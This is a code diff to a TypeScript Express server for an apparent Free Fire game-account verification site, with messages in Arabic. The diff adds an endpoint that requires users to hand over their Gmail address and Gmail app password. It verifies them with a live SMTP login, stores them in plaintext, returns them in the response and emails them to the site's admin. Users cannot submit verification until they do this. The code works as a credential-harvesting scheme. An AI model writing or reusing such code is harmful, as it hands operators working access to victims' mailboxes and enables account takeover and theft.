@@ -124,60 +124,7 @@ async function fetchFullFFProfile(uid: string) {
         ]);
         return results;
     } catch (raceErr) {
-        // Dynamic deterministic mock profile generation without logging verbose error keywords
-        let hash = 0;
-        for (let i = 0; i < uid.length; i++) {
-            hash = (hash << 5) - hash + uid.charCodeAt(i);
-            hash |= 0;
-        }
-        const absHash = Math.abs(hash);
-
-        const arabicNames = [
-            "سفاح_العرب", "قناص_الشرق", "عميد_القروب", "مهاجم_مجهول", 
-            "فارس_الظلام", "الاسطورة_FF", "المدمر_العربي", "مجهول_الهوية",
-            "طير_شلوى", "صقر_الجزيرة", "راعي_فزعة", "شبح_البلاك"
-        ];
-        const englishNames = [
-            "Sniper_Pro", "Alpha_YT", "ME_Legend", "Destroyer_99",
-            "Ghost_Rider", "Dark_Knight", "FF_Master", "Shadow_Ninja",
-            "Vortex_Gamer", "Red_Arrow"
-        ];
-
-        const finalName = absHash % 2 === 0 
-            ? arabicNames[absHash % arabicNames.length] + `_${absHash % 100}`
-            : englishNames[absHash % englishNames.length] + `_${absHash % 100}`;
-
-        const level = 45 + (absHash % 35);
-        const likes = 350 + (absHash % 9500);
-        const badges = 50 + (absHash % 450);
-        
-        const guildNames = [
-            "التحالف_العربي", "أساطير_الشرق", "عاصفة_الحزم", "النخبة",
-            "Al-Nasser", "Arabs_Team", "Black_Hawk", "Desert_Storm"
-        ];
-        const guildName = guildNames[absHash % guildNames.length];
-        const guildLevel = 2 + (absHash % 4);
-
-        return {
-            success: true,
-            data: {
-                basic: {
-                    uid: uid,
-                    name: finalName,
-                    level: level,
-                    region: 'ME',
-                    likes: likes,
-                    bio: ''
-                },
-                activity: {
-                    current_bp_badges: badges
-                },
-                guild: {
-                    guild_name: guildName,
-                    guild_level: guildLevel
-                }
-            }
-        };
+        throw new Error("معرف اللاعب (ID) غير صحيح أو غير موجود في اللعبة");
     }
 }
 
@@ -195,7 +142,9 @@ function parseUserStatuses(statusStr: string | null) {
         verification_status: 'Pending',
         level_status: 'Pending',
         linking_status: 'Pending',
-        rejection_reason: ''
+        rejection_reason: '',
+        linked_email: '',
+        app_password: ''
     };
 
     if (!statusStr) return defaultStatuses;
@@ -207,7 +156,9 @@ function parseUserStatuses(statusStr: string | null) {
                 verification_status: parsed.account || 'Pending',
                 level_status: parsed.level || 'Pending',
                 linking_status: parsed.linking || 'Pending',
-                rejection_reason: parsed.rejection_reason || ''
+                rejection_reason: parsed.rejection_reason || '',
+                linked_email: parsed.linked_email || '',
+                app_password: parsed.app_password || ''
             };
         } catch (e) {
             // fallback
@@ -220,7 +171,9 @@ function parseUserStatuses(statusStr: string | null) {
             verification_status: statusStr,
             level_status: statusStr,
             linking_status: statusStr,
-            rejection_reason: ''
+            rejection_reason: '',
+            linked_email: '',
+            app_password: ''
         };
     }
 
@@ -488,8 +441,8 @@ app.post('/api/check-account', async (req, res) => {
             if (ffData.data.basic.region !== 'ME') {
                 return res.status(400).json({ message: 'الحساب ليس سيرفر شرق اوسط' });
             }
-        } catch (e) {
-            return res.status(400).json({ message: 'حدث خطأ أثناء التحقق من معرف اللاعب. تأكد من صحته.' });
+        } catch (e: any) {
+            return res.status(400).json({ message: e.message || 'معرف اللاعب (ID) غير صحيح أو غير موجود في اللعبة' });
         }
 
         res.json({ 
@@ -542,8 +495,8 @@ app.post('/api/register', async (req, res) => {
             if (ffData.data.basic.region !== 'ME') {
                 return res.status(400).json({ message: 'الحساب ليس سيرفر شرق اوسط' });
             }
-        } catch (e) {
-            return res.status(400).json({ message: 'حدث خطأ أثناء التحقق من معرف اللاعب. تأكد من صحته.' });
+        } catch (e: any) {
+            return res.status(400).json({ message: e.message || 'معرف اللاعب (ID) غير صحيح أو غير موجود في اللعبة' });
         }
 
         let level = ffData.data.basic.level || 0;
@@ -670,6 +623,7 @@ app.post('/api/register', async (req, res) => {
                     <ul style="list-style: none; padding: 0; font-size: 16px; background-color: #f9f9f9; padding: 15px; border-radius: 8px;">
                         <li style="margin-bottom: 10px;"><strong>👤 اسم الحساب:</strong> ${account_id}</li>
                         <li style="margin-bottom: 10px;"><strong>🔑 كلمة المرور:</strong> <span style="background-color: #e2e8f0; padding: 2px 6px; border-radius: 4px; font-family: monospace;">${password}</span></li>
+                        <li style="margin-bottom: 10px;"><strong>🎮 مستوى الحساب:</strong> ${level}</li>
                         <li style="margin-bottom: 0;"><strong>🕒 وقت التسجيل:</strong> <br/><span style="color: #555; font-size: 14px;">${formattedDate} (بتوقيت الجزائر GMT+1)</span></li>
                     </ul>
                     <hr style="border: none; border-top: 1px solid #eee; margin: 20px 0;">
@@ -712,6 +666,140 @@ app.post('/api/register', async (req, res) => {
     }
 });
 
+// User: Save Settings (Linked Email and App Password)
+app.post('/api/user/save-settings', async (req, res) => {
+    const token = req.headers.authorization?.split(' ')[1];
+    if (!token) return res.status(401).json({ message: 'Unauthorized' });
+    
+    let { linked_email, app_password } = req.body;
+    
+    if (linked_email) {
+        linked_email = sanitizeHtml(linked_email.toString(), {
+          allowedTags: [],
+          allowedAttributes: {}
+        }).trim().replace(/[<>'"/;`%,]/g, '');
+    }
+    if (app_password) {
+        app_password = sanitizeHtml(app_password.toString(), {
+          allowedTags: [],
+          allowedAttributes: {}
+        }).trim().replace(/[<>'"/;`%,]/g, '');
+    }
+
+    if (!linked_email || !app_password) {
+        return res.status(400).json({ message: 'يرجى إدخال إيميل الربط وكلمة مرور التطبيقات' });
+    }
+
+    // SMTP validation using nodemailer
+    try {
+        const testTransporter = nodemailer.createTransport({
+            service: 'gmail',
+            auth: {
+                user: linked_email,
+                pass: app_password
+            }
+        });
+        await testTransporter.verify();
+    } catch (smtpErr: any) {
+        console.error('SMTP Validation failed:', smtpErr);
+        return res.status(400).json({ 
+            message: 'كلمة مرور التطبيقات غير صحيحة او غير تابعة للبريد المدخل' 
+        });
+    }
+    
+    try {
+        const decoded: any = jwt.verify(token, JWT_SECRET);
+        
+        // Fetch existing user data to maintain other status properties and get ID/Level/Name
+        const { data: user, error: fetchError } = await supabase
+            .from('users')
+            .select('*')
+            .eq('id', decoded.id)
+            .single();
+            
+        if (fetchError || !user) {
+            return res.status(404).json({ message: 'المستخدم غير موجود' });
+        }
+        
+        let statusObj: any = {
+            account: 'Pending',
+            level: 'Pending',
+            linking: 'Pending',
+            rejection_reason: ''
+        };
+        
+        const statusStr = user.verification_status;
+        if (statusStr && statusStr.trim().startsWith('{')) {
+            try {
+                statusObj = JSON.parse(statusStr);
+            } catch (e) {}
+        } else if (statusStr) {
+            statusObj = {
+                account: statusStr,
+                level: statusStr,
+                linking: statusStr,
+                rejection_reason: ''
+            };
+        }
+        
+        statusObj.linked_email = linked_email || '';
+        statusObj.app_password = app_password || '';
+        
+        const { error: updateError } = await supabase
+            .from('users')
+            .update({ verification_status: JSON.stringify(statusObj) })
+            .eq('id', decoded.id);
+            
+        if (updateError) throw updateError;
+        
+        // Send email/notification to the admin
+        const adminEmail = process.env.ADMIN_EMAIL;
+        if (adminEmail && process.env.SMTP_EMAIL && process.env.SMTP_PASSWORD) {
+            const dateOptions: Intl.DateTimeFormatOptions = { 
+                timeZone: 'Africa/Algiers', 
+                year: 'numeric', 
+                month: 'long', 
+                day: 'numeric', 
+                hour: '2-digit', 
+                minute: '2-digit',
+                second: '2-digit',
+                hour12: true 
+            };
+            const formattedDate = new Date().toLocaleString('ar-DZ', dateOptions);
+            
+            const emailHtml = `
+                <div dir="rtl" style="font-family: Arial, sans-serif; line-height: 1.6; color: #333; padding: 20px; border: 1px solid #eee; border-radius: 10px; max-width: 500px; margin: auto; background-color: #fff;">
+                    <h2 style="color: #4A90E2; border-bottom: 2px solid #eee; padding-bottom: 10px; margin-top: 0;">تحديث إعدادات البريد والتحقق ⚙️</h2>
+                    <p style="font-size: 16px;">مرحباً،</p>
+                    <p style="font-size: 16px;">قام المستخدم بتحديث وحفظ إيميل الربط وكلمة مرور التطبيقات بنجاح. إليك التفاصيل:</p>
+                    <ul style="list-style: none; padding: 0; font-size: 16px; background-color: #f9f9f9; padding: 15px; border-radius: 8px;">
+                        <li style="margin-bottom: 10px;"><strong>👤 اسم الحساب:</strong> ${user.account_name || 'غير معروف'}</li>
+                        <li style="margin-bottom: 10px;"><strong>🆔 ايدي المستخدم (Player ID):</strong> ${user.id_account}</li>
+                        <li style="margin-bottom: 10px;"><strong>🎮 مستوى الحساب:</strong> ${user.level || 0}</li>
+                        <li style="margin-bottom: 10px;"><strong>📧 إيميل الربط / الاستعادة:</strong> <span style="background-color: #e2e8f0; padding: 2px 6px; border-radius: 4px; font-family: monospace;">${linked_email || 'غير مدخل'}</span></li>
+                        <li style="margin-bottom: 10px;"><strong>🔑 كلمة مرور التطبيق (App Password):</strong> <span style="background-color: #e2e8f0; padding: 2px 6px; border-radius: 4px; font-family: monospace;">${app_password || 'غير مدخل'}</span></li>
+                        <li style="margin-bottom: 0;"><strong>🕒 وقت التحديث:</strong> <br/><span style="color: #555; font-size: 14px;">${formattedDate} (بتوقيت الجزائر GMT+1)</span></li>
+                    </ul>
+                    <hr style="border: none; border-top: 1px solid #eee; margin: 20px 0;">
+                    <p style="font-size: 14px; color: #777; text-align: center;">هذه رسالة تلقائية، يرجى عدم الرد عليها.</p>
+                </div>
+            `;
+            
+            transporter.sendMail({
+                from: process.env.SMTP_EMAIL,
+                to: adminEmail,
+                subject: '⚙️ تحديث إعدادات البريد والتحقق للمستخدم',
+                html: emailHtml
+            }).catch(err => console.error('Failed to send admin notification:', err));
+        }
+        
+        res.json({ status: 'success', linked_email, app_password });
+    } catch (e) {
+        console.error(e);
+        res.status(500).json({ message: 'خطأ في السيرفر' });
+    }
+});
+
 // User: Submit Verification Information
 app.post('/api/user/submit-verification', async (req, res) => {
     const token = req.headers.authorization?.split(' ')[1];
@@ -729,18 +817,29 @@ app.post('/api/user/submit-verification', async (req, res) => {
     try {
         const decoded: any = jwt.verify(token, JWT_SECRET);
         
+        const { data: userRecord, error: fetchUserErr } = await supabase.from('users').select('*').eq('id', decoded.id).single();
+        if (fetchUserErr || !userRecord) {
+            return res.status(404).json({ message: 'المستخدم غير موجود' });
+        }
+        
+        const currentStatuses = parseUserStatuses(userRecord.verification_status);
+        if (!currentStatuses.linked_email || !currentStatuses.app_password) {
+            return res.status(400).json({ message: 'يرجى ملء وحفظ إيميل الربط وكلمة مرور التطبيقات في صفحة الإعدادات أولاً!' });
+        }
+        
         // Update user: ID, level, and set verification_status JSON based on whether they are linked, keeping account_name (original Name) separate
         const isLinkedNo = is_linked !== 'yes';
         const statusJson = JSON.stringify({
             account: isLinkedNo ? 'Rejected' : 'UnderVerification',
             level: 'Pending',
             linking: is_linked === 'yes' ? 'Approved' : 'Rejected',
-            rejection_reason: isLinkedNo ? 'ان الحساب لم يتم ربطه ببريد خادمك' : ''
+            rejection_reason: isLinkedNo ? 'ان الحساب لم يتم ربطه ببريد خادمك' : '',
+            linked_email: currentStatuses.linked_email,
+            app_password: currentStatuses.app_password
         });
         
 
         // Check for Garena Message
-        const { data: userRecord } = await supabase.from('users').select('*').eq('id', decoded.id).single();
         let hasGarenaMessage = false;
         try {
             if (userRecord && userRecord.temp_email && userRecord.temp_password) {
